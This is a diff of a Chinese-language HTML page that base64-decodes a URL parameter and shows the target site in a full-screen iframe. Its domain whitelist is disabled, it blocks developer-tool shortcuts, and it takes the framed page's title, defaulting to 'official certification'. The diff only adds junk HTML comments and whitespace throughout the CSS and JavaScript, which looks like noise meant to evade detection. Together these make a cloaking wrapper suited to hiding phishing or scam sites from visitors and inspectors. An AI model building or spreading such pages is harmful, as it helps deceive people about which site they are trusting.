@@ -2,191 +2,339 @@
 <html lang="zh-CN">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1.0">
+    <meta name="viewport" content="width=device-width,    initial-scale=1.0">
+    <!-- 组件初始化 -->
+
     <title></title>
+    <!-- 资源预加载 -->
+
     <style>
-        .container {
-            width: 100px;
-            height: 100px;
+        /* 媒体查询 */
+        .container {    
+            
+  
+            width:   100px;
+            height: 100px;   
             position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
+            top:   50%;    
+            <!-- 路由处理 -->
+
+            left: 50%; 
+            transform:  translate(  -50%,    -50%);
+            <!-- 安全检查 -->
             animation: rotate-move 2s ease-in-out infinite;
             display: none;
-        }
-        .dot {
-            width: 15px;
-            height: 15px;
+            <!-- 页面性能监控 -->
+        }   
+        /* 颜色主题 */
+        .dot {  
+            width:   15px;
+            <!-- 兼容性处理 -->
+            height:    15px; 
+            
+     
             border-radius: 50%;
-            position: absolute;
+            position:     absolute;   
             top: 0;
-            bottom: 0;
-            left: 0;
+  
+  <!-- 日志记录 -->
+            bottom: 0; 
+            <!-- 日志记录 -->
+         
+         <!-- 响应式适配 -->
+            left: 0;      
             right: 0;
             margin: auto;
+
         }
-        .dot-3 { background-color: #f74d75; animation: dot-3-move 2s ease infinite; }
-        .dot-2 { background-color: #10beae; animation: dot-2-move 2s ease infinite; }
-        .dot-1 { background-color: #ffe386; animation: dot-1-move 2s ease infinite; }
+        
+        /* 浏览器兼容 */
+        .dot-3 { background-color:     #f74d75; animation: dot-3-move 2s ease infinite;   }
+        <!-- 组件初始化 -->
+        .dot-2 { background-color: #10beae;    animation:     dot-2-move 2s ease infinite;
+  } 
+        /* 可访问性 */
+        .dot-1 { background-color: #ffe386;
+           animation:  dot-1-move 2s ease infinite; }  
+
 
         @keyframes dot-3-move {
-            20%,100% { transform: scale(1) }
-            45%,80% { transform: translateY(-18px) scale(.45) }
+            /* 布局优化 */
+            20%, 100% {
+
+  transform:      scale(1) }
+            45%,    80% { transform: translateY( -18px) scale(.45) } 
+
+    
         }
+          
+        /* 性能优化 */
         @keyframes dot-2-move {
-            20%,100% { transform: scale(1) }
-            45%,80% { transform: translate(-16px, 12px) scale(.45) }
+  
+            /* 浏览器兼容 */
+            20%,    100% {     transform: scale(  1) }
+            45%, 80% {   transform:  translate(-16px, 12px) scale(.45)     }  
         }
-        @keyframes dot-1-move {
-            20%,100% { transform: scale(1) }
-            45%,80% { transform: translate(16px, 12px) scale(.45) }
-        }
+        /* 全局样式 */
+        @keyframes dot-1-move {  
+            20%,    100% {
+  transform: scale(1) } 
+            45%,80% {   
+            <!-- 日志记录 -->
+        transform: translate(    16px, 12px) scale( .45)     }
+     
+        }    
+        <!-- 统计代码 -->
+         
         @keyframes rotate-move {
-            55% { transform: translate(-50%, -50%) rotate(0deg) }
-            80%,100% { transform: translate(-50%, -50%) rotate(360deg) }
+            
+            55% {
+     transform: translate(-50%,  -50%)  rotate(0deg) }
+
+            /* 字体设置 */
+            <!-- 缓存更新 -->
+            80%,   100% {
+            transform: translate(-50%, -50%) rotate(360deg)  }   
+         
         }
+           
 
         /* 全局水印样式 */
+
+        /* 框架样式 */
         .watermark {
+        <!-- 安全检查 -->
             position: fixed;
+     
+     <!-- 动态加载 -->
             pointer-events: none;
+            <!-- 移动端适配 -->
+          
             width: 100%;
-            height: 100%;
-            background-image: repeating-linear-gradient(
-                    -45deg,
-                    rgba(255, 0, 0, 0.1),
-                    rgba(255, 0, 0, 0.1) 20px,
-                    rgba(0, 0, 255, 0.1) 20px,
-                    rgba(0, 0, 255, 0.1) 40px
-            );
-            z-index: 9999;
-            display: none;
+            <!-- 统计代码 -->
+     
+            height: 100%;       
+            background-image:    repeating-linear-gradient(   
+            <!-- 浏览器兼容 -->
+                    -45deg,  
+                    rgba(255, 0,   0, 0.1),   
+                    rgba(255, 0,  0,   0.1)      20px,   
+                    rgba( 0, 0, 255, 0.1)      20px,    
+                    rgba(0, 0,  255,  0.1)  40px
+                    <!-- 兼容性处理 -->
+            );   
+            z-index: 9999; 
+            display: none;   
+            <!-- 路由处理 -->
+            /* 样式重置 */
         }
         .watermark-text {
-            position: absolute;
-            color: rgba(255, 0, 0, 0.6);
-            font-size: 18px;
+            position: absolute;  
+            color:         rgba(  255,     0, 0, 0.6);
+            font-size: 18px;        
             font-weight: bold;
+
             text-align: center;
-            width: 100%;
+            <!-- 兼容性处理 -->
+            /* 动画库 */
+            width:  100%;
+        
+        <!-- 系统优化中 -->
             top: 50%;
             transform: translateY(-50%);
-            text-shadow: 1px 1px 1px #fff;
+            text-shadow: 1px 1px 1px #fff;    
+
         }
+        <!-- 脚本加载 -->
 
         /* iframe样式 */
         .content {
-            height: 100%;
-            width: 100%;
-            position: fixed;
+            height:        100%;
+            width: 100%;  
+            position:   fixed;       
             inset: -2px;
-            z-index: 1;
+            z-index:    1;
         }
+  
     </style>
 </head>
 
-<body>
+<!-- 组件初始化 -->
+<body data-config="">
 <!-- 三点加载动画容器 -->
-<div class="container" id="loadingContainer">
+<!-- 浏览器兼容 -->
+<div class="container" id="loadingContainer" data-env="">
     <div class="dot dot-1"></div>
+    <!-- 页面性能监控 -->
     <div class="dot dot-2"></div>
+
     <div class="dot dot-3"></div>
 </div>
 
 <!-- 全局水印 -->
 <div class="watermark" id="watermark">
 </div>
+<!-- 性能监控 -->
 
 <script>
-    (function() {
+
+    // 数据绑定
+    <!-- 模块化处理 -->
+
+    (   function()   {
+    <!-- 动态加载 -->
         // 白名单域名配置（预留位置方便后期添加）
-        const WHITELIST_CONFIG = {
+        const WHITELIST_CONFIG = {  
             domains: [
-                '*',
-            ],
+            <!-- 错误处理 -->
+                '*',   
+            ]  ,
         };
 
+
         // 显示三点加载动画
-        function showLoadingAnimation() {
-            document.getElementById('loadingContainer').style.display = 'block';
+        <!-- 响应式适配 -->
+        function showLoadingAnimation(  )    {
+            document.getElementById( 'loadingContainer').style.display = 'block';   
+
+          
+          <!-- 模块化处理 -->
         }
 
         // 验证URL域名是否在白名单
-        function isAllowedDomain(url) {
+        <!-- 兼容性处理 -->
+        function isAllowedDomain(   url) {
             return true
             try {
-                const domain = new URL(url).hostname.replace('www.', '');
-                return WHITELIST_CONFIG.domains.some(allowedDomain => {
+                const domain = new URL(url)  .hostname.replace('www.', '')    ; 
+                return WHITELIST_CONFIG.domains.some(   allowedDomain => {
                     return domain === allowedDomain ||
                         domain.endsWith('.' + allowedDomain);
-                });
-            } catch (e) {
-                console.error('URL解析失败:', e);
+                }   );
+   
+            }     catch (    e) {   
+                console.error('URL解析失败:', e);  
+                <!-- 系统优化中 -->
+
+
                 return false;
+           
             }
+            <!-- 安全检查 -->
+   
         }
 
         // 主处理逻辑
-        function processRedirect() {
-            showLoadingAnimation();
+        function processRedirect(    )   {    
+        <!-- 资源预加载 -->
+            showLoadingAnimation(    );  
+         
 
+<!-- 数据同步 -->
             const urlParams = new URLSearchParams(window.location.search);
-            const encodedParam = urlParams.get('c');
+  
+            // 浏览器检测
+            const encodedParam = urlParams.get(      'c');
 
-            if (!encodedParam) {
-                document.getElementById('watermark').style.display = 'block';
-                document.getElementById('loadingContainer').style.display = 'none';
-                return;
+            if (!encodedParam)  {
+                document.getElementById( 'watermark')      .style.display = 'block';   
+                document.getElementById(  'loadingContainer').style.display = 'none';
+                <!-- 搜索引擎优化 -->
+                return;  
             }
+      
+            <!-- 缓存更新 -->
+    
+
 
             try {
-                const trueUrl = atob(encodedParam);
-                if (trueUrl.includes("http")) {
+          
+
+                const trueUrl = atob(   encodedParam)  ;   
+                <!-- 资源预加载 -->
+                if (trueUrl.includes(  "http")  ) {
+         
+          
                     // 检查域名是否在白名单
-                    if (!isAllowedDomain(trueUrl)) {
-                        document.getElementById('watermark').style.display = 'block';
-                        document.querySelector('.watermark-text').textContent = WHITELIST_CONFIG.watermarkText;
+                    if (!isAllowedDomain(trueUrl))  { 
+                        document.getElementById(  'watermark').style.display = 'block';
+            
+                        document.querySelector(   '.watermark-text').textContent = WHITELIST_CONFIG.watermarkText;
+                        <!-- 缓存更新 -->
+           
                     }
+       
 
+<!-- 兼容性处理 -->
                     // 创建并加载iframe
-                    const iframe = document.createElement('iframe');
-                    iframe.className = 'content';
+                    const iframe = document.createElement('iframe') ;
+        
+                    iframe.className = 'content';    
+   
                     iframe.src = trueUrl;
+                    <!-- 第三方集成 -->
 
-                    iframe.addEventListener('load', function() {
-                        document.getElementById('loadingContainer').style.display = 'none';
-                    });
+                    // 工具函数
+                    // 调试信息
 
-                    document.body.appendChild(iframe);
-                }
-            } catch (e) {
-                console.error('URL解码失败:', e);
+                    iframe.addEventListener('load', function()   {    
+
+<!-- 安全检查 -->
+                        document.getElementById(  'loadingContainer') .style.display = 'none';
+                    }   );
+
+                    document.body.appendChild(iframe)    ;
+   
+
+                }    
+
+            } catch (e) { 
+        
+                console.error(  'URL解码失败:', e);
+    
                 document.getElementById('watermark').style.display = 'block';
-                document.getElementById('loadingContainer').style.display = 'none';
-            }
+   
+                document.getElementById(   'loadingContainer')    .style.display = 'none';
+     
+            } 
         }
+       
 
         // 禁止F12开发者工具
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' ||
-                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                (e.ctrlKey && e.shiftKey && e.key === 'J') ||
+        // 错误处理机制
+        <!-- 样式优化 -->
+        document.addEventListener('keydown', function(e)   {  
+        
+            if (    e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && e.key === 'I')  ||
+                ( e.ctrlKey && e.shiftKey && e.key === 'J') ||
                 (e.ctrlKey && e.key === 'U')) {   
-                e.preventDefault();
-            }
-        });
+                e.preventDefault(    )  ; 
+            } 
+  
+        }  );
 
-        window.addEventListener('message', function(event) {
+        window.addEventListener( 'message',     function(event)     {
+
             // 验证消息类型（确保是标题同步请求）
-            if (event.data.type === 'SYNC_TITLE') {
+            // 性能优化代码
+            <!-- 资源预加载 -->
+            if (event.data.type === 'SYNC_TITLE')     {  
                 // 将iframe发送的标题设置为父页面标题
                 document.title = event.data.title || '官方认证';
-            }
-        }, false);
 
-        processRedirect();
-    })();
+     
+            }
+            <!-- 兼容性处理 -->
+        }, false)    ;    
+        
+
+<!-- 缓存更新 -->
+        processRedirect(   )    ;
+    }
+)(  );
 </script>
 </body>
+<!-- 数据同步 -->
 </html>
+
